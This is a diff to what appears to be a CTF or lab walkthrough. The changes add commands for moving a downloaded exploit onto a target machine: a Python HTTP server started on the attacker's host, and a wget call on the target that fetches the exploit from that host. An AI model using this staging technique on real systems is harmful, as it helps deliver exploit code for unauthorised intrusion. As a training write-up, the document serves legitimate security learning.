@@ -128,11 +128,11 @@ We find one and download the exploit.
 ![image](https://user-images.githubusercontent.com/31168741/199806720-0134067b-2762-48ca-b830-ee4d28153eb8.png)
 
 Step 5:
-Running a python server in the host machine so that we can copy the exploit to the target machine.
+Running a python server in the host machine `python3 -m http.server 80` so that we can copy the exploit to the target machine.
 
 ![image](https://user-images.githubusercontent.com/31168741/199806805-4fb64c04-ee75-4a27-a721-e9ef97397e13.png)
 
-Transferring the exploit to the target machine using the Python web server and wget:
+Transferring the exploit to the target machine using the Python web server and wget: `wget [host-ip]/[exploit]` (must be in the location where the server is running)
 
 ![image](https://user-images.githubusercontent.com/31168741/199806868-7bcfbb84-a83c-41ad-9573-34c9027566ce.png)
 
